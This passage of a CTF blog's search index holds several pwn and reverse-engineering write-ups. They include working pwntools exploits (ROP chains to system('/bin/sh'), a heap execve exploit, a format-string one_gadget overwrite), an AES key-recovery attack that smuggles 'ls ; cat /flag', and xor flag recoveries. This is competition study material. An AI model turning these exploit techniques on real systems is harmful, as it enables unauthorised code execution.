p32(0x1) # write payload += p32(0x3b) # execve payload += p32(0x3) # close create_string(0x7f, payload) # Make space for filename malloc delete_string(0) # Trigger execve(\u0026#34;/bin/sh\u0026#34;) sla(b\u0026#34;Choose an option\u0026#34;, b\u0026#34;5\u0026#34;) sl(b\u0026#34;/bin/sh\u0026#34;) p.interactive() Flag: SEKAI{shitty_heap_makes_a_shitty_security}\n","description":"Writeup for Sekai CTF 2024","id":4,"section":"posts","tags":["Reverse","Pwn","heap"],"title":"Sekai CTF 2024","uri":"https://duythucne22.github.io/posts/2024/sekaictf2024/"},{"content":"Pwn adventure Use stack pivoting for this challenge\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 from pwn import * context.log_level = \u0026#39;debug\u0026#39; info = lambda msg: log.info(msg) s = lambda data: p.send(data) sa = lambda msg, data: p.sendafter(msg, data) sl = lambda data: p.sendline(data) sla = lambda msg, data: p.sendlineafter(msg, data) sn = lambda num: p.send(str(num).encode()) sna = lambda msg, num: p.sendafter(msg, str(num).encode()) sln = lambda num: p.sendline(str(num).encode()) slna = lambda msg, num: p.sendlineafter(msg, str(num).encode()) def GDB(): if not args.REMOTE: gdb.attach(p, gdbscript=\u0026#39;\u0026#39;\u0026#39; b*main+18 c \u0026#39;\u0026#39;\u0026#39;) input() if args.REMOTE: p = remote(\u0026#39;dyn.ctf.pearlctf.in\u0026#39;, 30014) else: p = process(\u0026#39;./adventure\u0026#39;) GDB() bss = 0x404000 hatchEgg = 0x401223 fflush_got = 0x404038 pop_rdi = 0x000000000040121e pop_rsi_r15 = 0x0000000000401871 ret = 0x000000000040101a sla(b\u0026#39;choice: \u0026#39;,b\u0026#39;2\u0026#39;) sla(b\u0026#39;2. No\u0026#39;,b\u0026#39;1\u0026#39;) pay = b\u0026#39;a\u0026#39;*0x20 + p64(bss+0x720) pay += p64(pop_rdi) + p64(fflush_got) pay += p64(0x401242) # call puts sla(b\u0026#39;name\u0026#39;,pay) p.recvuntil(b\u0026#39;with \u0026#39;) p.recvline() # print(hex(u64(p.recv().ljust(8,b\u0026#39;\\x00\u0026#39;)))) libc = u64(p.recv().ljust(8,b\u0026#39;\\x00\u0026#39;)) - 0x07f1b0 info(hex(libc)) system = libc + 0x050d60 pay = b\u0026#39;a\u0026#39;*0x11 + b\u0026#39;/bin/sh\\x00\u0026#39; + b\u0026#39;a\u0026#39;*0x8 + p64(bss+0x720) # getchar() pay += p64(pop_rdi) + p64(bss+0x710) pay += p64(ret) pay += p64(system) sl(pay) # bss write p.interactive() ","description":"Writeup for Pearl CTF 2024","id":5,"section":"posts","tags":["Reverse"],"title":"Pearl CTF 2024","uri":"https://duythucne22.github.io/posts/2024/pearctf2024/"},{"content":"This year wn challenge was so hard, it also got lot of crypto encryption inside that :((\nEncrypted runner Description:\nYou won't be able to run anything but ls, echo or date, hahahaha!\nIn the challenge, chal.py will only encrypt safe commands (date, echo, ls).\nOur goal is to somehow encrypt arbitary commands (and send it to the remote).\nLeaking private aes key If you try encrypting and decrypting characters above 255, you can see this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ python3 chal.py Welcome to encrypted command runner. What do you want to do? - encrypt command (e.g. \u0026#39;encrypt echo test\u0026#39;) - run command (e.g. \u0026#39;run fefed6ce5359d0e886090575b2f1e0c7\u0026#39;) - exit encrypt ls 子AA子AA子AA子AA子 Encrypted command: 4e3b832513a430854cf80c64a087f37b What do you want to do? - encrypt command (e.g. \u0026#39;encrypt echo test\u0026#39;) - run command (e.g. \u0026#39;run fefed6ce5359d0e886090575b2f1e0c7\u0026#39;) - exit run 4e3b832513a430854cf80c64a087f37b Output: ls: cannot access \u0026#39;aAAdAAkAA\u0026#39;$\u0026#39;\\021\u0026#39;\u0026#39;AA\u0026#39;$\u0026#39;\\024\u0026#39;: No such file or directory ... 子AA子AA子AA子AA子 has been replaced to aAAdAAkAA\\021AA\\024!\nThe reason is the following:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // aes binary void Cipher(uint *data_buf,long aes_struct) { byte i; AddRoundKey(0,data_buf,aes_struct); // This is called i = 1; while( true ) { SubBytes(data_buf); // But the first SubBytes() call resets data to \\x00 ShiftRows(data_buf); if (i == 10) break; MixColumns(data_buf); AddRoundKey(i,data_buf,aes_struct); i = i + 1; } AddRoundKey(10,data_buf,aes_struct); return; } After the call of AddRoundKey(\u0026hellip;), the first call of SubBytes(\u0026hellip;) reset characters above 255 to \\x00.\nTherefore in decrypting (reverse of encrypting), the extra AddRoundKey(\u0026hellip;) call can be used to leak the private aes key.\nNow, there is some mathematical relationship (xor 0x52) between the decryption output and the aes key. But at the ctf, I don\u0026rsquo;t really want to spend time thinking about, so I simply bruteforce it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 def write_key(key_bit: int): key = key_bit.to_bytes(1, \u0026#34;little\u0026#34;) + b\u0026#34;\\x01\u0026#34; * 15 with open(\u0026#34;key\u0026#34;, \u0026#34;bw\u0026#34;) as f: f.write(key) # The mappings is the same for each key byte position mappings = [] for key_bit in range(256): write_key(key_bit) data = \u0026#34;子\u0026#34; + \u0026#34;A\u0026#34; * 15 enc_str = helper(\u0026#34;encrypt\u0026#34;, data) out = helper(\u0026#34;decrypt\u0026#34;, enc_str) mappings.append(out[0]) print(mappings) # [82, 83, 80, 81, 86, 87, 84, 85, 90, 91, 88, 89, 94, 95, 92, 93, 66, 67, 64, 65, 70, 71, 68, 69, 74, 75, 72, 73, 78, 79, 76, 77, 114, 115, 112, 113, 118, 119, 116, 117, 122, 123, 120, 121, 126, 127, 124, 125, 98, 99, 96, 97, 102, 103, 100, 101, 106, 107, 104, 105, 110, 111, 108, 109, 18, 19, 16, 17, 22, 23, 20, 21, 26, 27, 24, 25, 30, 31, 28, 29, 2, 3, 0, 1, 6, 7, 4, 5, 10, 11, 8, 9, 14, 15, 12, 13, 50, 51, 48, 49, 54, 55, 52, 53, 58, 59, 56, 57, 62, 63, 60, 61, 34, 35, 32, 33, 38, 39, 36, 37, 42, 43, 40, 41, 46, 47, 44, 45, 210, 211, 208, 209, 214, 215, 212, 213, 218, 219, 216, 217, 222, 223, 220, 221, 194, 195, 192, 193, 198, 199, 196, 197, 202, 203, 200, 201, 206, 207, 204, 205, 242, 243, 240, 241, 246, 247, 244, 245, 250, 251, 248, 249, 254, 255, 252, 253, 226, 227, 224, 225, 230, 231, 228, 229, 234, 235, 232, 233, 238, 239, 236, 237, 146, 147, 144, 145, 150, 151, 148, 149, 154, 155, 152, 153, 158, 159, 156, 157, 130, 131, 128, 129, 134, 135, 132, 133, 138, 139, 136, 137, 142, 143, 140, 141, 178, 179, 176, 177, 182, 183, 180, 181, 186, 187, 184, 185, 190, 191, 188, 189, 162, 163, 160, 161, 166, 167, 164, 165, 170, 171, 168, 169, 174, 175, 172, 173] We can now leak the remote\u0026rsquo;s private key.\nBy encrypting ls 子子子子子子子子子子子子子 on the remote, you get ls \\017[\\034\\203:Q\\031z\\a\\035\\252\\370\\373. (you can encrypt ls 子AAAAAAAAAAAA, ls A子AAAAAAAAAAA, \u0026hellip; sequentially to make it easier to read the output)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ nc encrypted-runner.2024.ctfcompetition.com 1337 == proof-of-work: disabled == Welcome to encrypted command runner. What do you want to do? - encrypt command (e.g. \u0026#39;encrypt echo test\u0026#39;) - run command (e.g. \u0026#39;run fefed6ce5359d0e886090575b2f1e0c7\u0026#39;) - exit encrypt ls 子子子子子子子子子子子子子 Encrypted command: a75d08c42ca08d8151c5485855c4ed13 What do you want to do? - encrypt command (e.g. \u0026#39;encrypt echo test\u0026#39;) - run command (e.g. \u0026#39;run fefed6ce5359d0e886090575b2f1e0c7\u0026#39;) - exit run a75d08c42ca08d8151c5485855c4ed13 Output: ls: cannot access \u0026#39;\u0026#39;$\u0026#39;\\017\u0026#39;\u0026#39;[\u0026#39;$\u0026#39;\\034\\203\u0026#39;\u0026#39;:Q\u0026#39;$\u0026#39;\\031\u0026#39;\u0026#39;z\u0026#39;$\u0026#39;\\a\\035\\252\\370\\373\u0026#39;: No such file or directory ... We can now recover 13 bytes of the private key:\n1 2 3 4 out = b\u0026#39;ls \\017[\\034\\203:Q\\031z\\a\\035\\252\\370\\373\u0026#39; key = bytes() for val in out: key += bytes([mappings.index(val)]) We still don\u0026rsquo;t know the first 3 bytes of the private key, but we can just bruteforce it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 text = b\u0026#39;ls 0123456789abc\u0026#39; encrypted = bytes.fromhex(\u0026#34;33f7eca2f2d35e7ed18900b952b27bcf\u0026#34;) i = 0 while i \u0026lt; 256 ** 4 - 1: new_key = bytes([i % 256, (i // 256) % 256, i // (256 ** 2)]) + key[3:] i += 1 if i % (256 ** 2) == 0: print(i // (256 ** 2)) aes = AES.new(new_key, AES.MODE_ECB) enc_text = aes.encrypt(text) if enc_text == encrypted: print(\u0026#34;FOUND IT\u0026#34;) print(new_key) # new_key = b\u0026#39;N\\xa3\\x93]\\tN\\xd1h\\x03K(UO\\xf8\\xaa\\xa9\u0026#39; exit() With that, we leaked the private key! We can now encrypt arbitary commands.\n1 2 3 aes = AES.new(new_key, AES.MODE_ECB) enc_text = aes.encrypt(b\u0026#34;ls ; cat /flag\u0026#34; + b\u0026#34;\\x00\\x00\u0026#34;) print(enc_text.hex()) # b110678752de46dabf6f9cd87bb4abd3 We can send the hash, and get the glorious flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ nc encrypted-runner.2024.ctfcompetition.com 1337 == proof-of-work: disabled == Welcome to encrypted command runner. What do you want to do? - encrypt command (e.g. \u0026#39;encrypt echo test\u0026#39;) - run command (e.g. \u0026#39;run fefed6ce5359d0e886090575b2f1e0c7\u0026#39;) - exit run b110678752de46dabf6f9cd87bb4abd3 Output: aes chal.py key CTF{hmac_w0uld_h4ve_b33n_bett3r} ... ","description":"Writeups and solving unfinished challs during game time","id":6,"section":"posts","tags":["ctf","pwn"],"title":"Google CTF 2024 Writeup","uri":"https://duythucne22.github.io/posts/2024/googlectf2024/"},{"content":"PWN hipwn Checksec\n1 2 3 4 5 6 7 8 9 10 $ checksec chall [*] \u0026#39;/mnt/c/Users/duyth/Downloads/chall\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled SHSTK: Enabled IBT: Enabled Stripped: No main function:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int __cdecl main(int argc, const char **argv, const char **envp) { unsigned int nbytes; // [rsp+Ch] [rbp-54h] BYREF char nbytes_4[72]; // [rsp+10h] [rbp-50h] BYREF unsigned __int64 v6; // [rsp+58h] [rbp-8h] v6 = __readfsqword(0x28u); setbuf(_bss_start, 0LL); setbuf(stdin, 0LL); while ( 1 ) { puts(\u0026#34;How much???\u0026#34;); __isoc99_scanf(\u0026#34;%u\u0026#34;, \u0026amp;nbytes); puts(\u0026#34;ok... now send content\u0026#34;); read(0, nbytes_4, nbytes); nbytes_4[nbytes] = 0; puts(nbytes_4); puts(\u0026#34;wanna do it again?\u0026#34;); __isoc99_scanf(\u0026#34;%u\u0026#34;, \u0026amp;nbytes); if ( nbytes != 1337 ) break; puts(\u0026#34;i knew it\u0026#34;); } return 0; } puts will print till NULL byte, so we can easily leak canary and libc base.\nnbytes_4[72] which is 72 bytes, program also allow overwrite\n\u0026ndash;\u0026gt; payload = 73 bytes 1 more byte to overwrite to get the canary leak\nThen overwrite $rbp with 8 more bytes\n\u0026ndash;\u0026gt; payload = 88 bytes to get the libc leak\nAfter obtain the libc address, craft the shellcode with 3 component:\nsystem(), /bin/sh, pop rdi, ret.\nNote: 1337 also use for endless loop, to exit just enter different number\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 #!/usr/bin/python3 from pwn import * context.binary = exe = ELF(\u0026#39;./chall\u0026#39;,checksec=False) libc = ELF(\u0026#39;./libc.so.6\u0026#39;,checksec=False) # p = process(exe.path) p = remote(\u0026#39;45.153.243.57\u0026#39;, 1337) # gdb.attach(p, gdbscript = \u0026#39;\u0026#39;\u0026#39; # b*main+141 # c # \u0026#39;\u0026#39;\u0026#39;) # input() def loop(data): p.sendlineafter(b\u0026#39;much???\\n\u0026#39;, str(1337)) p.send(data) def choice(choice): p.sendlineafter(b\u0026#39;again?\\n\u0026#39;, str(choice)) payload = b\u0026#39;a\u0026#39;*73 loop(payload) p.recvuntil(payload) canary = u64(b\u0026#39;\\0\u0026#39; + p.recv(7)) log.info(\u0026#34;canary leak: \u0026#34; + hex(canary)) choice(1337) payload = b\u0026#39;a\u0026#39;*88 loop(payload) p.recvuntil(payload) libc_leak = u64(p.recv(6) + b\u0026#39;\\0\\0\u0026#39;) libc.address = libc_leak - 0x29d90 log.info(\u0026#34;libc leak: \u0026#34; + hex(libc_leak)) log.info(\u0026#34;libc base: \u0026#34; + hex(libc.address)) choice(1337) pop_rdi = libc.address + 0x000000000002a3e5 ret = libc.address + 0x0000000000029cd6 payload = b\u0026#39;a\u0026#39;*72 payload += p64(canary) payload += b\u0026#39;a\u0026#39;*8 payload += p64(pop_rdi) + p64(next(libc.search(b\u0026#39;/bin/sh\u0026#39;))) payload += p64(ret) payload += p64(libc.sym[\u0026#39;system\u0026#39;]) loop(payload) choice(1) p.interactive() text editor This is super hard for me, i didn\u0026rsquo;t solve it during the game time. So I think it is a good idea to redo it so i can understand better and practice.\nAsusal checksec firsts\n1 2 3 4 5 6 7 8 9 10 $ checksec chall [*] \u0026#39;/mnt/d/Pwn/asis/text_editor/chall\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled SHSTK: Enabled IBT: Enabled Stripped: No Full security turn on, nothing strange for some chals like this.\nStatic analysis with IDA:\nmain()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+Ch] [rbp-114h] BYREF char v5[264]; // [rsp+10h] [rbp-110h] BYREF unsigned __int64 v6; // [rsp+118h] [rbp-8h] v6 = __readfsqword(0x28u); setup(argc, argv, envp); puts(\u0026#34;Welcome to simple text editor!\u0026#34;); while ( 1 ) { while ( 1 ) { while ( 1 ) { print_menu(); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4); if ( v4 != 1 ) break; edit_text(); } if ( v4 != 2 ) break; save_text(v5); } if ( v4 == 3 ) break; show_error(); } puts(\u0026#34;Bye!\u0026#34;); return 0; } print_menu()\n1 2 3 4 5 6 7 8 int print_menu() { puts(\u0026#34;Menu:\u0026#34;); puts(\u0026#34;1. edit text\u0026#34;); puts(\u0026#34;2. save text\u0026#34;); puts(\u0026#34;3. exit\u0026#34;); return printf(\u0026#34;\u0026gt; \u0026#34;); } edit_text()\n1 2 3 4 5 6 int edit_text() { printf(\u0026#34;Enter new text: \u0026#34;); read(0, \u0026amp;text, 0x108uLL); return puts(\u0026#34;Done!\u0026#34;); } Our input will be store in the .bss (\u0026amp; text ) area\nsave_text()\n1 2 3 4 5 int __fastcall save_text(void *a1) { memcpy(a1, \u0026amp;text, 0x108uLL); return puts(\u0026#34;Saved the current text!\u0026#34;); } Input will be store on stack.\nshow_error()\n1 2 3 4 int show_error() { return printf(off_4120); } Normal notification for false error.\nImportant offsets text = 0x4020\noff_4210 = 0x4210\ninput start from 4020 and print at 4120 \u0026ndash;\u0026gt; offset 0x100\n8 bytes overflow\nwe need $rdi content a valid address that point to exe\nThen we found (0x8008)\ntest with string abcd\\n\nwe will overflow the last 2 bytes which is p16(0x8008)\nbut because PIE is dynamic, we temporarily enable NOASLR (expected to brute force to leak exe)\nmust brute because we still have 1 bit next to 0x8008 (high or low) - \u0026gt; outside the exe\nOnce we have leaked the base exe, next we will leak libc using puts@GOT\nThe last thing is to call one_gadget overwrite in return 1 function (here choose main function )\nwe need to leak stack to point to ow one_gadget\nThe stack can leak in two ways:\nuse fmt at %6$p\nused __environ in libc\nhave stack, calculate $rip and then fmt normally\nrbp common rsp should return in show_text() function will be dc38\noffset = 0x128\nWhen entering the payload string to fmt, we will not printf immediately but we will use the save_text() function to put our payload on the stack to change $rip\nsince one_gadget needs to require $rbp-offset to be a writeable address, after the 0x100 byte payload will be 8 bytes of address \u0026amp; text\nbecause of 1 bit change so brute rate is 1/16 (hand brute🥲)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 from pwn import * context.binary = exe = ELF(\u0026#34;./chall_patched\u0026#34;,checksec=False) libc = ELF(\u0026#34;./libc.so.6\u0026#34;,checksec=False) ld = ELF(\u0026#34;./ld-linux-x86-64.so.2\u0026#34;,checksec=False) if args.REMOTE: p = remote(\u0026#39;45.153.243.57\u0026#39;,13337) else: p = process(exe.path) def GDB(): #NOASLR if not args.REMOTE: gdb.attach(p, gdbscript=\u0026#39;\u0026#39;\u0026#39; b*edit_text+48 b*show_error+23 b*main+195 b*save_text+38 c \u0026#39;\u0026#39;\u0026#39;) input() info = lambda msg: log.info(msg) sla = lambda msg, data: p.sendlineafter(msg, data) sa = lambda msg, data: p.sendafter(msg, data) sl = lambda data: p.sendline(data) s = lambda data: p.send(data) GDB() def edit(data): sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;1\u0026#39;) sa(b\u0026#39;text: \u0026#39;,data) def show(): sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;4\u0026#39;) def save(): sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) payload = b\u0026#39;a\u0026#39;*0x100 + p16(0x8008) edit(payload) show() exe_leak = u64(p.recv(6) + b\u0026#39;\\0\\0\u0026#39;) exe.address = exe_leak - 0x4008 info(\u0026#34;exe leak: \u0026#34; + hex(exe_leak)) info(\u0026#34;exe base: \u0026#34; + hex(exe.address)) payload = b\u0026#39;a\u0026#39;*0x100 + p64(exe.got[\u0026#39;puts\u0026#39;]) edit(payload) show() libc_leak = u64(p.recv(6) + b\u0026#39;\\0\\0\u0026#39;) libc.address = libc_leak - libc.sym[\u0026#39;puts\u0026#39;] info(\u0026#34;libc leak: \u0026#34; + hex(libc_leak)) info(\u0026#34;libc base: \u0026#34; + hex(libc.address)) text = exe.sym[\u0026#39;text\u0026#39;] payload = b\u0026#39;%6$p|\u0026#39; payload = payload.ljust(0x100, b\u0026#39;P\u0026#39;) payload += p64(text) edit(payload) show() stack = int(p.recvuntil(b\u0026#39;|\u0026#39;)[:-1], 16) rip = stack - 0x128 info(\u0026#34;stack leak: \u0026#34; + hex(stack)) info(\u0026#34;stack need: \u0026#34; + hex(rip)) gadget = [0xebcf1,0xebcf5,0xebcf8] one_gadget = libc.address + gadget[1] info(\u0026#34;one gadget: \u0026#34; + hex(one_gadget)) package = { ((one_gadget) \u0026gt;\u0026gt; 0) \u0026amp; 0xffff : rip, ((one_gadget) \u0026gt;\u0026gt; 16) \u0026amp; 0xffff : rip+2, ((one_gadget) \u0026gt;\u0026gt; 32) \u0026amp; 0xffff : rip+4, } order = sorted(package) payload = f\u0026#39;%{order[0]}c%18$hn\u0026#39;.encode() payload += f\u0026#39;%{order[1] - order[0]}c%19$hn\u0026#39;.encode() payload += f\u0026#39;%{order[2] - order[1]}c%20$hn\u0026#39;.encode() payload = payload.ljust(0x40) payload += flat( package[order[0]], package[order[1]], package[order[2]] ) payload = payload.ljust(0x100,b\u0026#39;P\u0026#39;) + p64(text) edit(payload) save() show() p.interactive() ","description":"Asis CTF 2024 pwn write up","id":7,"section":"posts","tags":["ctf","pwn","ROP"],"title":"Asis CTF Writeup","uri":"https://duythucne22.github.io/posts/2023/asisctf2023/"},{"content":"checkers checkers\nThis one very easy, just look into IDA or using anything to view strings.\nFlag: actf{ive_be3n_checkm4ted_21d1b2cebabf983f}\nzaza nc challs.actf.co 32760\nzaza\nThis challenge have 3 check, a number, sussy check, and a string:\nThat number is 4919 and the second number is any.\nAfter that, This challenge get our input and xor with string:\n\u0026quot;anextremelycomplicatedkeythatisdefinitelyuselessss\u0026quot;\nand compare with:\n\u0026quot;2\u0026amp; =$!-( \u0026lt;*+*( ?!\u0026amp;$$6,. )' $19 , #9=!1 \u0026lt;*=6 \u0026lt;6;66#\u0026quot;\nSo, by the property of xor, we can get back our string easy:\n1 2 3 4 from pwn import xor x1 = b\u0026#34;2\u0026amp; =$!-( \u0026lt;*+*( ?!\u0026amp;$$6,. )\u0026#39; $19 , #9=!1 \u0026lt;*=6 \u0026lt;6;66#\u0026#34; x2 = b\u0026#34;anextremelycomplicatedkeythatisdefinitelyuselessss\u0026#34; print(xor(x1,x2)) #output: b\u0026#39;SHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEP\u0026#39; Put things into the server:\nFlag: actf{g00dnight_c7822fb3af92b949}\nBananas A friend sent this to me. Can you help me find out what they want?\nnc challs.actf.co 31403\nHint: Elixir is awesome :)\nCheck that file:\nThis challenge was written in Erlang, I spent minutes to find a decompiler\nI found this decompile, easy to build and use: https://github.com/aerosol/decompilerl\nAnd here is the result:\nSo, in order to the function check() return true, we need passing 2 arguments, first one is a number and second is string \u0026ldquo;banana\u0026rdquo;\nThe number is very easy to calculate, It was 103\nPut things into the server:\nFlag: actf{baaaaannnnananananas_yum}\nWord Search 110 points, 47 solves\nI decided to put a few puzzles in the kids\u0026rsquo; menu for the new AngstromCTF restaurant, but nobody has been able to solve it. Maybe you could take a crack at it.\nAuthor: rous\nHint: The flag is composed of only English words and underscores.\nThis one like a programing challenge than reverse challenge, so I was collab with @d4rkn19ht to solve this.\nI am confused what is the hint and this maze.\nLet look in to the binary, It was renamed and look clean, but still hard to understand:\nThe main function as sus function take 2 command-line arguments and do something\nAfter I researched, one of them is Hint from pdf file and another is our input (flag):\nSo, that mean this program do something with the hint from pdf file to check our input, let\u0026rsquo;s figout what does it do!\nThis program check char by char with the hint, some important symbol like \u0026ldquo;(\u0026rdquo; or \u0026ldquo;?\u0026rdquo; will appear often.\nAfter a lot of times debugging and testing, I found the rules, let\u0026rsquo;s me explain:\nFirst, suppose () is a block, this will be this format:\n(char + somechar)char ... 'char\nExample:\nThat somechar = \u0026lsquo;h\u0026rsquo;, and I think (k is start of our block, 'k is end of the block. Continue,\nThe format is: ?sometext?\nThis progam take each char from our flag and compare with rule: char of flag not in somechar(blue) and must be in sometext(yellow), after that, we will obtain only 1 char, this will compare with our flag.\nSo, in this case, this char was b.\nI called blacklist is the buffer saved \u0026ldquo;hjU5fl\u0026rdquo;, after check with sometext,\nremaining buffer will be \u0026ldquo;fl\u0026rdquo;.\nThe main flow:\ntake somechar from block -\u0026gt; put it into buffer -\u0026gt; take char from sometext -\u0026gt; check that char (if that char in buffer delete this char from buffer, if not, compare this char with flag)\nThat mean, we need a code to get the char to compared, this is my optimized code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 buffer = [] enc = \u0026#34;(kh)k\u0026#39;k(Qj)Q\u0026#39;Q(2U)2\u0026#39;2(35)3\u0026#39;3(Ff)F(ul)u?hbjU5?\u0026#39;F(9M)9\u0026#39;9(4 C)4\u0026#39;4(iv)i?ofM?\u0026#39;u?tCl?(SP)S\u0026#39;S\u0026#39;i?Pvh?_(k4)k\u0026#39;k(Q0)Q\u0026#39;Q(2Y)2\u0026#39;2(9 j)9\u0026#39;9(uB)u(S I)S(N7)N(oH)o?40Yi?(3a)3\u0026#39;3(Fi)F\u0026#39;F\u0026#39;S(XG)X\u0026#39;o?arij?(4k)4\u0026#39;4\u0026#39;u(fs)f(d f)d?kBr?(ix)i\u0026#39;i\u0026#39;X(cH)c\u0026#39;d(VZ)V(q x)q\u0026#39;q(DJ)D(W B)W?eIxG?(sp)s\u0026#39;s(xN)x\u0026#39;x(pD)p\u0026#39;p\u0026#39;N\u0026#39;W?pND7g?(Mq)M\u0026#39;M?uqH?\u0026#39;c\u0026#39;f\u0026#39;V?HsfZl?\u0026#39;D(eT)e\u0026#39;e(j N)j\u0026#39;j?xJaT??BNr?_(kh)k\u0026#39;k(QS)Q\u0026#39;Q(2U)2\u0026#39;2(32)3\u0026#39;3(FZ)F(4s)4(XG)X?hSaU2?\u0026#39;F(97)9\u0026#39;9\u0026#39;4(Sw)S\u0026#39;S?nZ7s?(uc)u\u0026#39;u(iQ)i\u0026#39;i\u0026#39;X?cdwQG?_(k6)k\u0026#39;k(Qq)Q\u0026#39;Q(F8)F(9 8)9(i v)i(e4)e?i6q?(2t)2\u0026#39;2(3i)3\u0026#39;3\u0026#39;F\u0026#39;9(4 u)4\u0026#39;4(p R)p(oK)o(f b)f(Vr)V(D8)D?tin8?(us)u\u0026#39;u(SF)S\u0026#39;i(X 1)X\u0026#39;X(sS)s(NR)N(c 9)c(q o)q?8eus?\u0026#39;S\u0026#39;p(M X)M\u0026#39;f(W f)W(jm)j?Fvx1?\u0026#39;s(xo)x\u0026#39;x\u0026#39;c?Sop?\u0026#39;M\u0026#39;e\u0026#39;j?rR?\u0026#39;N(d8)d?eRX?\u0026#39;o?sK9?\u0026#39;d\u0026#39;q\u0026#39;W?sb8?\u0026#39;V?iro?\u0026#39;D?8v4??efm?\u0026#34; i = 0 def remove_one(c): global buffer for i in range(len(buffer)): if c==buffer[i]: buffer = buffer[:i] + buffer[i+1:] return flag = \u0026#34;\u0026#34; while i \u0026lt; len(enc): if enc[i]==\u0026#39;)\u0026#39;: buffer.append(enc[i-1]) if enc[i]==\u0026#39;?\u0026#39;: tmp = [] n = enc[i+1:].index(\u0026#39;?\u0026#39;) for j in range(i+1,i+n+1): tmp.append(enc[j]) i+=n+1 for c in tmp: if c in buffer: remove_one(c) else: flag+=c if enc[i]==\u0026#39;_\u0026#39;: flag+=\u0026#39;_\u0026#39; i+=1 print(flag) #both_irregular_and_inexpessire Flag: actf{both_irregular_and_inexpessive}\nTI My friend sent me this town simulator. I can\u0026rsquo;t seem to beat it. Can you help me?\nThis one little guessy, so I don\u0026rsquo;t like it so much.\nFirst of all, I figiout what is this file with extension .8xp of the file given?\nProgram or data file used by the Texas Instruments TI-83 Plus and TI-84 series calculators; can be transferred to the calculator from a computer using a TI Connectivity Cable and the included software.\nTo run an 8XP file on your PC, you\u0026rsquo;ll need to use an emulator that can simulate a Texas Instruments graphing calculator.\nSo I found some emulator like this: wabbitemu, tiemu, vti, \u0026hellip;\nI trying many times to run this file but I alway got an error:\nWhen I run with TI-83 plus rom:\nI also try many rom, like ti-83, ti84, ti-83 ce,\u0026hellip; and still got an error:\nSo, before reversing the code, I was figout how to run that file, it\u0026rsquo;s the time to find the correct version of calculator and emulator support it.\nAnd I was excited that @Nova found this one: https://cemu.info/\nAfter download and run with ti-84ce.rom, download libraryclibs.8xg and send it to emulator. Finally, it\u0026rsquo;s worked:\nBefore this, I view this file (TOWN.8xp) as hex and I found some interested string:\nSo, I think the correct name is somewhere on this file.\nI decided to debug this program and bypass the first check:\nStop the program, Step out ultil it requires our input, type some text and step over to debug.\nAfter some times, I found that address D1AB38 is the jump check (jump to fail, print \u0026ldquo;I think you are lying\u0026hellip;\u0026rdquo;) for name; So, to bypass this check, we easily turn on the zero flag:\nAnd got into the TOWN:\nAfter this, I figout something about these option:\nOption 5: Input a string, and print this string with reverse string after that, I enter \u0026ldquo;11112222\u0026rdquo;:\nOption 4:\nOption 3:\nOption 2:\nOption 1:\nThis one happen when you enter nothing:\nIf your enter sometext:\nAnd the program exit.\nI figout that the 5 option just the hint to obtain flag, not process our flag. Follow option 2, we need to find the correct name first:\nI try with this input and try to find where our input saved on memory:\nD1A820 address of first name input\nD1AB38 check name\nD1A7E4 input address of code talk to guard\nD1A7C0 address of printed string option 1\n$DIA968: get input function\n$021D2C: print str function\nAfter some times trying to debug, I found this:\nIt seem the program load some thing from memory, and it was \u0026ldquo;CE C RELEASE\u0026rdquo;\nTry it as a name and it correct:\nSo, we find the correct name, but where flag?\nAt the time I view the find as hex, I also found this sussy string:\nThis like our flag but encrypted, I trying to xor with the flag format and this happened:\nAs we can see, xored string was RRRLL\u0026hellip;, but R is index 5 at of the string \u0026ldquo;CE C RELEASE\u0026rdquo;.\nI try it with string like \u0026ldquo;RRRLLL\u0026rdquo; + \u0026ldquo;AAA\u0026rdquo; or \u0026ldquo;RRRLLL\u0026rdquo; + \u0026ldquo;EEE\u0026rdquo;,\u0026hellip;(follow on option 4 and 3) and this is result:\nSo there is a string I found:\n1 2 3 4 5 x = bytes.fromhex(\u0026#39;33 31 26 2A 37 29 75 32 38 1A 7D 75 1A 71 36 32 72 24 21 2E 05 2B 65 2F 32\u0026#39;) guess = b\u0026#34;RRRLLLAAAEEEEEEAAALLLRRR2\u0026#34; b = guess + b\u0026#39;\\x00\u0026#39;*(25 - len(guess)) print(len(guess),len(x)) print(xor(x,b)) #ouput: b\u0026#39;actf{e4sy_80_4ss3embIy7}\\x00\u0026#39; Flag: actf{e4sy_80_4ss3embIy7}\nMoon 